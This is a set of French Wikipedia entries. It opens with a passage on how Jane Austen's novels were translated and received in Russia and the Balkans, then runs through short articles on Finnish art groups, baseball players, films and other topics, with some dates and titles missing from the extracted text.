Dans un pays où il n'existe pas de tradition de littérature féminine, la première traduction en russe ne date que de 1967. Certes, les femmes de lettres britanniques n'étaient pas tout à fait inconnues au . Ainsi, en le journal "Vestnik Evropy", après avoir relevé leur nombre impressionnant, citant et celles , fait l'éloge d"Emma", dont l'. En 1854 encore, Aleksandr Druzhinin s'étonne de l' en Angleterre, alors qu'ailleurs en Europe les femmes écrivent peu, citant , mais en Russie, jusqu'à récemment, on valorise plutôt les romans à forte orientation sociale et politique.
Cependant, le français étant couramment pratiqué dans les milieux aristocratiques, on pouvait lire Jane Austen dans ses traductions françaises, ce qui fut peut-être le cas de Pouchkine, lorsqu'il était en exil dans le sud de l'empire, en particulier dans la cosmopolite Odessa en 1823-1824, où il commença la rédaction d"Eugène Onéguine" (""), son roman en vers. D'ailleurs, les similitudes entre "Eugène Onéguine" et "Pride and Prejudice" ont été pointées dès 1910 par les observateurs occidentaux. Nabokov les constate, sans les approfondir, en 1964. Richars Tempest en 1993 souligne la ressemblance des visites du domaine du héros par l'héroïne, en l'absence (Darcy) ou après le départ de ce dernier (Onéguine), en 2002 on en disserte dans le supplément littéraire du "Times".
On sait que Boris Pasternak possédait les œuvres de Jane Austen dans sa datcha de Peredelkino et Nabokov, malgré son préjugé très russe envers les femmes-écrivains, accepta d'inclure un de ses romans ("Mansfield Park") dans ses ' ; mais il faut attendre la libéralisation de la culture amorcée par Nikita Khrouchtchev pour voir un début de publication en Russie. "Pride and Prejudice" paraît d'abord en anglais en 1961, puis dans la traduction d'Immanuil Marshak en 1967, avec une longue introduction de N. M. Demurova, dans une collection prestigieuse de l'Académie des sciences de l'URSS, "Monuments littéraires". Si, cette année-là ' ("") fut , la perestroïka va accélérer les choses : les six romans sont traduits en 1988-1989 par Ekaterina Genieva et paraissent en URSS la même année que "Le Docteur Jivago" et "L'Archipel du Goulag".
Après l'écroulement de l'URSS en 1991 et la disparition consécutive de la culture d'État, émerge une culture populaire soumise aux lois du marché, et le phénomène d"austenmania" présent à l'Ouest apparait alors en Russie post-soviétique. Ainsi, au début du tous les romans de Jane Austen sont accessibles, avec, en 2007, une nouvelle traduction pour ' et ' par Ekaterina Genieva (qui y ajoute "Lady Susan") ; mais le sont aussi leurs adaptations et transpositions pour le cinéma et la télévision, générant, comme à l'Ouest, des blogs et des discussions sur Internet et des articles dans la presse populaire. C'est en 2006, dans des articles consacrés au film de Joe Wright, que, pour la première fois en Russie, a été fait le rapprochement de "" avec le roman de Pouchkine.
Traductions dans les langues de l'Europe du Sud-Est.
Dans ces pays qui, géographiquement, appartiennent, au moins en partie, aux Balkans, et qui, historiquement, connurent la domination ottomane, puis, à part la Grèce, l'influence soviétique avant de se tourner vers l'Union européenne, les traductions de Jane Austen sont tardives. Il y eut bien une première tentative sans lendemain, en Serbie en 1929 (traduction de ') et en Roumanie en 1943 (traduction de '), mais dans l'ensemble, on ne trouve pas de traductions avant les années 1950 (Grèce, Serbie) voire 1960 (Slovénie, Croatie, Roumanie).
Traductions en grec.
Découverte tardive.
Il n'y a aucune traduction de Jane Austen au , ce qui s'explique par la situation politique. Soumis pendant des siècles à l'Empire ottoman, les Grecs, une fois obtenue leur indépendance en 1830, se construisent une identité en replongeant dans leur passé classique et byzantin. On privilégie donc le roman historique à la Walter Scott ou le roman d'aventure. On lit volontiers Defoe et Swift et surtout, sous l'influence de la diaspora établie essentiellement en France, des auteurs français comme Alexandre Dumas et Eugène Sue.
Dans la première moitié du on traduit plutôt des auteurs contemporains, aussi la première traduction de Jane Austen ne date-t-elle que de 1950. Il s'agit d'une traduction de ', titrée ' ['], par Ninila Papayianni, financée par le consulat britannique. Louable tentative de traduire fidèlement l'original, elle échoue cependant à en restituer l'ironie ; ainsi, les remarques de Mr Bennet à sa femme sont prises au premier degré, les sous-entendus moqueurs supprimés. Le vocabulaire choisi est parfois trop orienté : là où Jane Austen écrit que Mrs Bennet aimait ('), "news" est traduit par "", un terme argotique qui signifie plutôt « ragots ».
Deux autres traductions paraissent dans les années 1960. L'une, signée P. V. est probablement un simple piratage de la précédente tant elle la démarque.
Yeorgia Alexiou-Proteou est l'auteur de la seconde, plus fluide, plus sensible à l'ironie de Mr Bennet, mais elle utilise une langue parfois trop familière et un registre trop moderne.
Elle traduit aussi "Persuasion", sous le titre "" ["Anna Elliot"], traduction qui tend à l'exactitude, mais emploie, elle aussi, un registre trop familier. En outre, l'absence de notes peut gêner les lecteurs, la plupart ignorant tout du contexte.
"Sense and Sensibility" est traduit à son tour en 1967 par Rena Papanikolaou sous le titre ' ['] (Rationalité et sensibilité).
Aucune nouvelle traduction ne paraît pendant la dictature des colonels et seulement deux à la fin des années 1980 : la première traduction d"Emma" (') en 1988 par Fontas Kondilis (rééditée en 1997, 2000, 2011) et une nouvelle traduction de ', titrée cette fois " [Yperpháneia kai prokatalps"] en 1989 par N. Margarinos (rééditée en 2006).
De l'importance des adaptations.
Les années 1990 voient une augmentation très significative du nombre des nouvelles éditions, qui coïncide avec la diffusion, sur la télévision d'État grecque, de la mini-série de la BBC. Cette version (sous-titrée) est régulièrement rediffusée, comme les films d'Ang Lee et de Douglas McGrath. Leur relative fidélité à l'atmosphère et à l'esprit de l'époque rendent, grâce à l'image, l'univers de Jane Austen plus accessible et augmentent l'intérêt pour son œuvre.
Parait d'abord une anthologie richement illustrée, édité et traduite par Anna Papastravou en 1993, puis les éditions Smil entreprennent, à partir de 1996, la traduction de l'intégralité des romans en commençant par "Pride and Prejudice", traduit par Dimitris G. Kikizas.
Toutes ces traductions, œuvres de traducteurs professionnels, sont accompagnées de notes explicatives, d'illustrations, d'éléments biographiques, d'extraits d'analyses de spécialistes anglais reconnus, comme R. W. Chapman, Isobel Armstrong ou Tony Tanner.
"" ["]" ("Persuasion"), par le même traducteur, parait en 1998, accompagné d'une longue citation de l'écrivain anglophile Dimitrios Kapetanakis (1912-1944) et d'un article de A. Walton Litz sur la structure du roman.
Sont éditées ensuite trois traductions par Alexandra Papathanasopoulou :
La nouvelle traduction d"Emma" par Andreas Pappas, paraît en même temps (aussi rééditée en 2011).
Ces traductions sont en général plus précises, bien qu'elles peinent encore à transcrire toute la richesse du texte (finesse des dialogues, sophistication de la voix narrative) et contiennent parfois des erreurs d'interprétation. Leurs inexactitudes et leur manque de subtilité ne permettent pas au grand public de se rendre compte que Jane Austen est bien plus qu'un auteur de contes de fée modernes ou de romans d'amour, ce qui est aussi le cas des traductions abrégées pour la jeunesse, comme celle de "Pride and Prejudice" parue en 2004 qui . Mais elles ont le mérite d'exister, en attendant mieux.
Traductions en roumain.
En Roumanie, seul pays de langue latine, ce sont d'abord « le grand Will », Milton et les poètes romantiques qui ont eu les honneurs de la traduction au sortir de la domination ottomane, sans doute à cause du rayonnement de Mihai Eminescu (1850-1889), qui admirait Byron, Shelley et Coleridge. Mais Jane Austen n'est pas ignorée : elle est présente dans l' de 1898, celle de 1929 (où elle est traitée de ' et non de "").
L'intérêt pour les romancières anglaises du (souvent à travers leurs traductions françaises) grandit d'ailleurs dans les années 1930.
La première traduction de Jane Austen parait en pleine guerre, en 1943. C'est une traduction de ' que Gheorge Nenișor titre ', peut-être pour concurrencer "Les Cinq Filles de Mrs Bennet", à l'époque disponible en Roumanie, ou parce que cette traduction l'a influencé. Le régime s'étant engagé du côté des forces de l'Axe, cette traduction est presque un acte subversif. Dans sa préface, Nenișor présente Austen comme la première (chronologiquement) des femmes de lettres anglaises et la situe dans la tradition comique représentée par Caragiale et Molière ; il affirme que ' est loin d'être un ' (roman banal) juste bon à être simplement consommé. Sa traduction est particulièrement réussie.
Aucune traduction pendant la période communiste où seule la lecture de la littérature soviétique est encouragée. Mais une nouvelle traduction, "", par Ana Almăgeanu, préfacée par Anda Teodorescu, sort en 1968. Son succès entraîne deux rééditions : 1969, 1970.
' est traduit à son tour en 1972 par Carmen-Liliana Mareș, sous le titre '.
Quand le régime de Ceaușescu se durcit en 1973, les classiques paraissent sans danger aux yeux de la "Securitate", ce qui explique la rapidité de parution des traductions suivantes : ' (') en 1976 par Costache Popa, "Emma" en 1977 par Anca Roșu, "Persuasion" ("") par Costache Popa en 1980. C'est Popa la traductrice la plus capable de rendre l'ironie et les subtiles nuances du texte original. En revanche, la traduction d'Anca Roșu prend trop de libertés avec le texte d"Emma".
La présence de minorités hongroises entraîna deux traduction en hongrois, celle de ' par Ilona Róna en 1984 et celle de ' par Miklos Zsenczi en 1988.
Après 1990, la libéralisation du marché du livre entraîne l'explosion des traductions mais aussi la publication en langue originale (par exemple, ' en 1995). "Mansfield Park" (') est traduit une première fois en 1993 par Daniela Elena Radu, puis en 2004 par Adina Ihora.
Les traductions anciennes sont aussi rééditées : celle de "Persuasion" par Popa en 1992 ; de ' par Ana Almăgeanu en 1992, 1995, 1998 ; de ' par Carmen-Liliana Mareș en 1995, mais avec le titre exact "".
' est retraduit en 1993 par Profira Sadoveanu et en 2004 par Emilia Oanţă ; ' en 2004 par Silvia Constantin ; ' par Anca Florea en 2004 ; ' la même année par Lidia Grădinaru. Mais ces nouvelles traductions sont souvent peu rigoureuses, les traductrices assez inexpérimentées et n'ayant pas un niveau d'anglais assez approfondi.
En Roumanie aussi l'influence des adaptations, disponibles depuis les années 1995, est sensible. Une frange de la population semble d'ailleurs penser qu'elles dispensent de lire le texte ; des articles critiques ont paru sur le net et dans la presse, et de nombreux sites web consacrés à Jane Austen ont vu le jour .
Traductions dans les langues slaves du sud.
Trois pays issus de l'ex-Yougoslavie, après une histoire mouvementée, sont indépendants depuis 1991 pour la Croatie et la Slovénie, 2004 pour la Serbie. On y parle des langues slaves, qui utilisent un alphabet latin, dans le cas du slovène et du croate, et deux alphabets, un cyrillique et un latin, pour le serbe.
Traductions en serbe.
Une première tentative de faire connaître Jane Austen a lieu vers 1929, avec la traduction de ' par Danica S.Janković (1898-1960). Francophone et anglophone, elle enseigna à l'université de Belgrade de 1918 à 1922, puis étudia à Londres et Oxford de 1922 à 1924. ' ("") (« Sous l'influence des autres »), qui devait être le premier tome d'une collection d'œuvres choisies, n'eut pas le succès escompté. Certes, la traduction contient des erreurs, des coupures, utilise des archaïsmes ; les noms sont serbisés (« Elizabeth Elliot » devient « Jelisaveta »), mais elle a le mérite d'exister, alors que l'anglais n'était pas enseigné en Serbie et qu'il n'existait pas de dictionnaire anglais-serbe. Elle sera rééditée en 1957, sans réelles corrections, par "Rad", un éditeur d'œuvres romanesques et poétiques classiques.
Le bicentenaire de la naissance de Jane Austen est l'occasion de la sortie en 1975 des œuvres complètes en six volumes (tirés à et rapidement vendus). Ce sont des reprises des traductions précédentes, sauf pour "Persuasion", traduit par Ljubica Bouer-Protić (1909-1999).
Deux traductions ont aussi été rééditées pendant les pires années des guerres de Yougoslavie : celle de Simeonović en 1996 (l'année de la sortie du film d'Ang Lee en Serbie), celle de Simić en 1997 (sans doute liée à la diffusion du "Orgueil et Préjugés" de la BBC). Paraît aussi une nouvelle traduction d"Emma", par Vojin Ančić, en 1998-1999. Le texte est plus moderne, plus précis, et vise aussi un public populaire, celui qui a vu le film de McGrath, sorti en 1997. " bénéficie depuis 2012 d'une nouvelle traduction, par Branislava Maoduš.
Traductions en slovène.
Dans ce pays, où la langue et une littérature endogène ont joué un rôle fédérateur, les romans historiques de Walter Scott ont servi de modèle littéraire, tant pour Josip Jurčič (1844-1881), auteur en 1866 du premier roman en slovène, " (Le dixième frère), que pour les romanciers suivants, au moins jusqu'en 1945. Ensuite, durant la période communiste, le « réalisme critique », prôné par Georg Lukács et les courants occidentaux (Modernisme, Existentialisme) se partagent la littérature : les romans de Jane Austen sont bien trop éloignés de ces formes littéraires pour intéresser les Slovènes, plutôt familiarisés, qui plus est, avec la littérature germanique.
Pourtant, l'importance de la romancière anglaise n'est pas ignorée, puisqu'elle est citée dans deux articles de "" ("Le Matin") : en 1928, dans un article traduit de l'anglais comparant la diversité de la littérature européenne face à la médiocrité du roman américain ; en 1939, dans la traduction d'un article d'Edmond Jaloux paru dans "les Nouvelles littéraires". Et en 1954, un article, résumant des passages de l'essai de Somerset Maugham qui vient de paraître, range Jane Austen parmi les « classiques », terme aux sous-entendus cependant légèrement péjoratifs en Slovénie.
Ne sont d'abord traduits que des extraits :
Le tournant décisif se produit en 1968.
En 1964 a commencé la traduction systématique, accompagnée de commentaires conséquents, des grands classiques de la littérature par des spécialistes. ' est traduit en 1968 par Majda Stanovnik qui l'intitule '. Elle justifiera son choix dans la réédition de 2004 : ', qui implique une attitude hautaine et distante, est plus adapté que ', qui signifie bien « orgueil », mais uniquement avec une valeur positive et ' est plus neutre que ' qui implique l'idée de parti-pris avec une nuance comique. Rapa Šuklje en fait la présentation, expliquant les notions étrangères à un lecteur slovène comme la condition féminine à l'époque, la profession de clergyman, la notion de gentleman, mais en étudie aussi l'ironie, les qualités esthétiques et l'art que possède Jane Austen de (""). Il y en a toutefois peu d'écho dans la presse.
Au même moment (1968-1969), "Emma", traduit par Franci Prajs, paraît en feuilleton dans le magazine populaire "Antena". En dépit du public visé, un public féminin plus intéressé par l'histoire d'amour et la complexité de l'intrigue que l'exactitude littéraire, ce n'est pas une adaptation mais une traduction, qui s'appuie vraisemblablement sur celle de 1954 en serbe. Ainsi, les deux images de Jane Austen apparaissent en parallèle en Slovénie : l'auteur de romans sentimentaux, parfois confondue avec les romancières de l'époque romantique, comme Charlotte Brontë et George Sand, et l'écrivain « classique », qui n'idéalise pas ses héroïnes et ironise sur les stéréotypes patriarcaux.
À partir de 1986 passent à la télévision les mini-séries de la BBC tirées des œuvres de Jane Austen, en anglais, sous-titrés, et avec le titre choisi pour les traductions en slovène. Après l'indépendance, en 1996, la popularité du film "Emma" génère la traduction de ' (littéralement, ') par Ferdinan Miklavc, une nouvelle "Emma" l'année suivante, traduction tournée vers un lectorat populaire par le philosophe Zoja Skušek, qui explique le sens de "Knightley" et de "Donwell".
Et comme la théorie de la traduction prônée en Slovénie défend le respect du contexte socioculturel de l'œuvre traduite (ainsi, on ne doit pas traduire "gentleman" par ', mot « bourgeois » qui veut seulement dire « monsieur »), les traductions d'Austen n'ont pas gommé l'aspect « idéologiquement discutable » de ses romans et ne comportent pas de passages censurés, condensés ou adaptés. Même, en 1992, la stratégie amoureuse en jeu dans ' est utilisée par Dragana Kršić pour illustrer le processus de prise de conscience décrit par Hegel dans sa "Phénoménologie de l'esprit" ('), dans ' ("Orgueil et Préjugés", ou Science de l’expérience de la conscience).
En 2004, pour sa troisième édition, la traduction de ' par Majda Stanovnik paraît dans une nouvelle collection, ' (Héritage). Les autres romans de Jane Austen ont enfin été traduits en slovène par Mekta Osredkar : "Northanger Abbey" (') en 2011, "Persuasion" (') en 2012 et "Mansfield Park" en 2013.
Autres langues européennes.
Les romans de Jane Austen, et parfois ses écrits de jeunesse et son roman inachevé, sont progressivement traduits dans d'autres langues européennes, avec une nette prévalence pour "Pride and Prejudice". Les adaptations cinématographiques ont aussi, en particulier pour "Emma" et "Sense and Sensibility", joué un rôle indubitable. Comme un peu partout, ce sont "Northanger Abbey", "Mansfield Park" et dans une moindre mesure "Persuasion" qui sont le moins traduits.

</doc>
<doc id="8979853" url="https://fr.wikipedia.org/wiki?curid=8979853" title="État de Chuuk">
État de Chuuk



</doc>
<doc id="8979854" url="https://fr.wikipedia.org/wiki?curid=8979854" title="État de Pohnpei">
État de Pohnpei



</doc>
<doc id="8979855" url="https://fr.wikipedia.org/wiki?curid=8979855" title="Kaas chante Piaf">
Kaas chante Piaf

Kaas chante Piaf est le neuvième album studio de Patricia Kaas sortie le . C'est un album constitué exclusivement de reprises de chansons interprétées par Édith Piaf.

</doc>
<doc id="8979856" url="https://fr.wikipedia.org/wiki?curid=8979856" title="Dans l’œil du Dragon">
Dans l’œil du Dragon



</doc>
<doc id="8979857" url="https://fr.wikipedia.org/wiki?curid=8979857" title="État de Kosrae">
État de Kosrae



</doc>
<doc id="8979863" url="https://fr.wikipedia.org/wiki?curid=8979863" title="Le Témoin (film, 1946)">
Le Témoin (film, 1946)

Le Témoin () est un film de procès italien réalisé par Pietro Germi en 1946, sous la supervision d’Alessandro Blasetti.
Synopsis.
Suspecté de meurtre, Pietro Scotti, un honnête citoyen, risque la peine de mort en raison d'un témoin à charge de dernière minute. Ce dernier, Giuseppe Marchi, un vieil employé de bureau, raconte qu'il a été bousculé par un homme qui sortait d'une porte cochère vu près du lieu du crime. Mais il s'avère que sa montre retardait et annule donc son témoignage. Pietro bénéficie d'un non-lieu. Essayant de refaire sa vie, il demande en mariage une jeune fille pauvre, Linda. Mais leur couple est perturbé par Giuseppe, qui semble suivre Pietro...
Thèmes.
Déjà dans ce film, qui signe les débuts de Pietro Germi comme réalisateur, on trouve sous une forme embryonnaire beaucoup de questions thématiques qui deviendront typique du cinéma de Germi : la dramaturgie de la loi, la tendance à regarder à l’intérieur et le partage typique entre le policier et le néoréalisme.
Affiches.
La réalisation des affiches du film a été confiée à l’affichiste Anselmo Ballester.

</doc>
<doc id="8979879" url="https://fr.wikipedia.org/wiki?curid=8979879" title="Gontran Hamel">
Gontran Hamel

Gontran Georges Henri Hamel (1883-1944) est un phycologue français.
Biographie.
En 1927, il a obtenu son doctorat en sciences naturelles avec une thèse sur les algues rouges des genres "Acrochaetium" et "Rhodochorton". Il est connu pour des recherches effectuées au « Laboratoire de Cryptogamie » du Muséum national d'histoire naturelle à Paris. Il serait mort en tentant d'atteindre Paris à vélo avant que la ville soit libérée en .
En 1924, avec Pierre Allorge (1891-1944), il est le cofondateur de la "Revue algologique". Il contribue également à la collection d’"exsiccata" « Algues de France ».
En 1942, Frederik Børgesen donne en son honneur aux algues brunes de la famille des "Chordariaceae" le nom de genre "Hamelella". Par ailleurs, l'espèce d'algue rouge "Lithothamnion hamelii" est une des nombreuses espèces qui portent son nom.

</doc>
<doc id="8979880" url="https://fr.wikipedia.org/wiki?curid=8979880" title="Bouche à oreille">
Bouche à oreille



</doc>
<doc id="8979883" url="https://fr.wikipedia.org/wiki?curid=8979883" title="Transports en commun de Besançon (Ginko)">
Transports en commun de Besançon (Ginko)



</doc>
<doc id="8979885" url="https://fr.wikipedia.org/wiki?curid=8979885" title="Cai Wenji">
Cai Wenji



</doc>
<doc id="8979887" url="https://fr.wikipedia.org/wiki?curid=8979887" title="Faîte suprême">
Faîte suprême



</doc>
<doc id="8979888" url="https://fr.wikipedia.org/wiki?curid=8979888" title="Barrage de police">
Barrage de police



</doc>
<doc id="8979890" url="https://fr.wikipedia.org/wiki?curid=8979890" title="Joe Nuxhall">
Joe Nuxhall

Joseph Henry Nuxhall (né le à Hamilton, Ohio, États-Unis et mort le à Fairfield, Ohio, États-Unis) est un ancien lanceur gaucher de la Ligue majeure de baseball plus tard devenu commentateur sportif.
Joe Nuxhall est le plus jeune joueur de l'histoire du baseball majeur, ayant revêtu l'uniforme des Reds de Cincinnati pour la première fois le à l'âge de 15 ans et 316 jours. Près de 8 ans plus tard, Nuxhall revient chez les Reds en 1952 et joue dans les majeures jusqu'en 1966. Toutes ses saisons se déroulent à Cincinnati, sauf la saison 1961 passée chez les Athletics de Kansas City et le début de sa saison 1962 avec les Angels de Los Angeles. Surnommé "The Ol' Left-Hander" (« le vieux gaucher »), il participe au match des étoiles en 1955 et 1956.
Il est commentateur sportif à la radio à partir de 1967 et élu au Temple de la renommée des Reds de Cincinnati en 1968. Son association avec les Reds dure 63 ans et se termine avec l'annonce de sa retraite en 2004, après 37 ans derrière le micro. Il succombe à un cancer le à l'âge de 79 ans.
La rue sur laquelle est située le Great American Ball Park, actuel stade où évoluent les Reds à Cincinnati, est nommée "Joe Nuxhall Way".

</doc>
<doc id="8979892" url="https://fr.wikipedia.org/wiki?curid=8979892" title="Groupe Septem">
Groupe Septem

Le Groupe Septem (en finnois "Septem-ryhmä") est un groupe artistique inspiré par l'impressionnisme et le néo-impressionnisme, actif durant la période de l'âge d'or de l'art finlandais. Fondé en 1912, il a contribué à un renouveau dans l'utilisation de la couleur par les artistes finlandais et au passage du symbolisme vers l'expressionnisme. Il est créé sous l'impulsion de Magnus Enckell, après la mauvaise réception des œuvres finlandaises au Salon d'Automne de 1908.
Contexte artistique en Finlande avant Septem.
À partir des années 1880 se développe l'âge d'or de l'art finlandais. Les thèmes nationaux se développent et les artistes se plaisent à représenter des paysages ou la vie paysanne traditionnelle, dans un style influencé par le réalisme de Jules-Bastien Lepage, particulièrement apprécié dans les pays nordiques. L'impressionnisme, en revanche, n'a pas joui d'un grand succès. À la fin du siècle, le réalisme se trouve conjugué au symbolisme, grâce à une nouvelle génération d'artistes finlandais ayant étudié à Paris, et pour qui ce courant permettait mieux d'exploiter des thèmes légendaires comme le Kalevala. Durant l'Exposition universelle de 1900, la Finlande possède un pavillon à part, décoré par Gallen-Kallela, qui illustre les aspirations du pays à l'indépendance et à son affirmation à l'international.
Cependant, en 1908, la centaine d’œuvres finlandaises présentées au Salon d'Automne reçoit des critiques assez négatives ; dans la revue "Art et décoration", le secrétaire du Salon Étienne Avenard retranscrit ainsi l'avis d'un visiteur : « Mais ces gens-là, c'est la mort des marchands de tubes ; ils ne mettent point de couleur. » Un compte-rendu de l'exposition paru dans "La Liberté" conclut que « toute la peinture finlandaise qui nous est montrée est mélancolique, triste, sombre ». Ces critiques mènent plusieurs artistes, et particulièrement Magnus Enckell, à promouvoir dès 1908 une nouvelle approche de la couleur dans l'art finlandais, principalement influencée par le néo-impressionnisme.
Apports du néo-impressionnisme.
C'est un artiste belge, Willy Finch, qui jouera le plus grand rôle dans la diffusion des principes impressionnistes et néo-impressionnistes en Finlande et dans les aspirations de Septem. Étudiant à Bruxelles puis à Paris, où il a fréquenté Georges Seurat et Paul Signac, il a été membre du groupe Les Vingt formé en 1883. C'est durant cette période qu'il peint la toile pointilliste "Les falaises de Douvres", qui sera exposée à Helsinki en 1901 puis en 1910.
Sur les conseils d'Albert Edelfelt, alors l'artiste finlandais le plus influent hors de son pays, il s'installe en Finlande en 1897 pour exercer en tant que céramiste dans une fabrique à Porvoo. Il commence alors à diffuser les principes de la peinture moderne, notamment par des articles ; celui qu'il publie dans le journal suédo-finlandais "Euterpe" présente en détails, pour la première fois en Finlande, les principes de l'impressionnisme, du pointillisme et l'œuvre de Seurat. En 1904, il co-organise avec Enckell une exposition au musée Ateneum d'Helsinki, dont les toiles sont choisies avec l'aide de Signac, Théo Van Rysselberghe et Georges Lemmen ; celles-ci comportent notamment des œuvres de Pissarro, Sisley, Monet, Degas et Renoir. Cette exposition diffuse véritablement les idées impressionnistes et néo-impressionnistes en Finlande.
Une nouvelle approche de la couleur basée sur le néo-impressionnisme est aussi promue par l'architecte et critique d'art Sigurd Frosterus, qui y consacre plusieurs articles et ouvrages. Son soutien s'exprime aussi, dès 1905, par l'achat d’œuvres pour sa collection personnelle, qui contient pour moitié des toiles de Finch et Enckell ainsi que d'autres artistes résolument néo-impressionnistes.
Fondation de Septem.
En 1912, le néo-impressionnisme apporté par Finch est consacré lors de la première exposition d'un groupe de sept artistes : Finch lui-même, Magnus Enckell, Yrjö Ollila, Mikko Oinonen, Verner Thomé, Juho Rissanen et Ellen Thesleff. Enckell en devient le leader et le membre le plus influent, tandis que Thesleff le quitte dès la deuxième exposition, en 1913, et est remplacée par Per Åke Laurén. À l'origine, le groupe n'a pas de nom spécifique et se fait appeler « groupe d'Enckell ». Il faut attendre la troisième exposition pour voir apparaître « Septem » dû aux sept membres, en référence aux Vingt dont avait fait partie Finch.
Le leadership d'Enckell au sein du groupe n'est pas un hasard. Depuis la mort d'Edelfelt en 1905, dont il a récupéré l'atelier parisien, il le remplace en tant qu'« ambassadeur » de l'art finlandais en Europe. Son attrait pour la couleur n'est pas nouveau mais remonte aux années 1890 et à ses premiers séjours à Florence. Cependant, l'année 1908 marque un tournant dans sa peinture, qui adopte alors véritablement les principes néo-impressionnistes développés en France. Mais si Enckell s'empare des techniques impressionnistes et néo-impressionnistes, le groupe dans son ensemble n'y est pas strictement attaché ; les peintures de Rissanen, par exemple, sont peu représentatives de ces tendances.
Réception en Finlande.
Comme pour la plupart des groupes d'avant-garde, une certaine réticence se fait sentir chez une partie de l'opinion, et Frosterus rédige une préface au catalogue de la première exposition afin d'éclaircir les buts des artistes présentés et les principes de l'impressionnisme. Cependant, l'exposition a reçu un certain succès, et des oeuvres de Thesleff, Enckell, Oinonen et Finch ont été vendues dès le premier jour.
Pour l'historien d'art Sakari Saarikivi, la nationalité de Willy Finch lui a permis de n'être pas retenu dans une certaine forme d'art « national » alors en vogue en Finlande, qui rejetait les principes impressionnistes et pointillistes. En se concentrant sur des aspects strictement esthétiques, Septem tient une place à part dans l'art finlandais du début du XXe siècle, alors marqué avant tout par sa ferveur nationale. Le groupe acquiert néanmoins une certaine notoriété auprès de quelques jeunes artistes parmi lesquels Marcus Collin, Tyko Sallinen, Alvar Cawén, Ragnar Ekelund et William Rosenberg, qui seront les pionniers de l'expressionnisme en Finlande. Le groupe a aussi joué le rôle de tremplin en invitant régulièrement de jeunes artistes.
Un autre groupe artistique, le Groupe de Novembre, est fondé en 1916 et suit les principes du divisionnisme et du cubisme. Malgré leurs influences internationales et la proximité de certains membres avec Septem, ces deux groupes ont été souvent opposés dans la critique puis dans l'historiographie. Les recherches esthétiques de Septem étaient notamment considérées comme des influences étrangères, et leurs couleurs vives impropres à représenter les paysages finlandais, dont les teintes pâles reflétant la « lumière du Nord » idéalisée étaient une caractéristique depuis la fin du XIXe siècle. De leur côté, les « Novembristes » ont réintroduit un usage de couleurs sombres et de thèmes nationaux.
Dernières années et dissolution.
Malgré un début prometteur, Septem est assez vite négligé, principalement à cause du contexte historique et politique — la Première guerre mondiale d'une part, et la guerre civile finlandaise d'autre part. Enckell et Thomé, deux des membres fondateurs, ne participent pas à la dernière exposition. Le groupe est officiellement dissous en 1928, trois ans après la mort d'Enckell.
Expositions et membres.
1912, première exposition, au Musée Ateneum d'Helsinki.
1913, deuxième exposition, durant laquelle sont exposées quelques œuvres d'artistes français. Départ d'Ellen Thesleff, remplacée par Per Åke Laurén.
1914, troisième exposition et adoption du nom « Septem » en raison des sept membres, comme les Vingt.
1915, quatrième exposition.
1916, cinquième exposition. Fondation du Groupe de Novembre par Tyko Sallinen.
1917, sixième exposition.
1919, septième exposition, départ de Juho Rissanen qui rejoint le Groupe de Novembre. Arrivée de Uuno Alanko et Werner Åström.
1920, dernière exposition. Magnus Enckell et Verner Thomé n'y participent pas. Ils sont remplacés par Kaapo Wirtanen.
1928, dissolution officielle.

</doc>
<doc id="8979894" url="https://fr.wikipedia.org/wiki?curid=8979894" title="Rogers McKee">
Rogers McKee

Rogers Hornsby McKee (né le à Shelby, Caroline du Nord, États-Unis et mort le au même endroit) est un lanceur gaucher de baseball qui joue dans les Ligues majeures en 1943 et 1944 pour les Phillies de Philadelphie.
Biographie.
Adolescent parmi plusieurs à brièvement évoluer dans le baseball majeur, privé de joueurs enrôlés pour combattre dans la Deuxième Guerre mondiale, Rogers McKee est le le plus jeune lanceur du à remporter une victoire, obtenue au terme d'un match complet lancé au Forbes Field de Philadelphie contre les Pirates de Pittsburgh alors qu'il est âgé de 17 ans et 7 jours. Le seul lanceur officiellement reconnu plus jeune que McKee est Willie McGill, gagnant de 11 parties à l'âge de 16 ans en 1890, et possiblement Ed Knouff, dont la date exacte de naissance est inconnue, qui joua dans les majeures en 1885.
Rogers McKee dispute 4 matchs des Phillies de Philadelphie en 1943 et un dernier en 1944. Il fait ses débuts comme lanceur de relève face aux Cardinals de Saint-Louis le à l'âge de 16 ans, 11 mois et 3 jours. Ses 4 autres matchs joués avec les Phillies sont comme lanceur partant. Sa fiche est d'une victoire contre aucune défaite et sa moyenne de points mérités s'élève à 5,87 avec un retrait sur des prises en 15 manches et un tiers lancées. McKee meurt le à quelques jours de son .

</doc>
<doc id="8979895" url="https://fr.wikipedia.org/wiki?curid=8979895" title="Ginko (réseau de transport)">
Ginko (réseau de transport)



</doc>
<doc id="8979897" url="https://fr.wikipedia.org/wiki?curid=8979897" title="Verner Thomé">
Verner Thomé

Verner Thomé  (né le à Alajärvi en Grand-duché de Finlande et mort le à Helsinki) est un artiste peintre post-impressionniste finlandais. Il a été influencé par le vitalisme, un mouvement germano-scandinave qui a incorporé la philosophie de Friedrich Nietzsche.
Biographie.
En 1898–1899, Verner Thomé étudie à l'école de dessin de l'association des arts puis en 1901–1902, à l'Académie des beaux-arts de Munich. En 1903, il participe à l'exposition des artistes finlandais à Helsinki. En 1904, il voyage à Paris, en Espagne et au Maroc. De retour en Finlande il adopte une palette plus sombre.
En 1906, il est en Italie et en 1908 dans le sud de la France, après cela il cherche à représenter la lumière et l'ombre par les contrastes de couleurs. En 1909, il fonde le Groupe Septem avec Alfred William Finch, Knut Magnus Enckell, Yrjö Ollila, Mikko Oinonen, Juho Rissanen et Ellen Thesleff.
Ils sont inspirés par l'exposition franco-belge impressionniste et néo-impressionniste de 1904 à Helsinki où sont exposées des œuvres de Paul Signac et de Henri-Edmond Cross.
Verner Thomé est un peintre de la lumière dont les thèmes sont entre-autres les portraits, les plages et les enfants Il s'essaiera aussi au pointillisme.
Il est le père de Olof Eriksson.

</doc>
<doc id="8979899" url="https://fr.wikipedia.org/wiki?curid=8979899" title="Rts.ch">
Rts.ch



</doc>
<doc id="8979907" url="https://fr.wikipedia.org/wiki?curid=8979907" title="Estefanía Torres">
Estefanía Torres



</doc>
<doc id="8979911" url="https://fr.wikipedia.org/wiki?curid=8979911" title="Deux-Avril">
Deux-Avril

Deux-Avril ou II-Avril ou 2-Avril, avec ou sans majuscule et parfois sans trait d'union, peut désigner :
Calendrier.
2 avril, jour de l'année du calendrier grégorien, ou en cas d'année bissextile. 
Odonyme.
Les noms de plusieurs voies ou places, contiennent cette date sous diverses graphies, en référence à des événements survenus à cette même date.
Graphies en français.
Les événements rappelés par ces odonymes sont notamment :
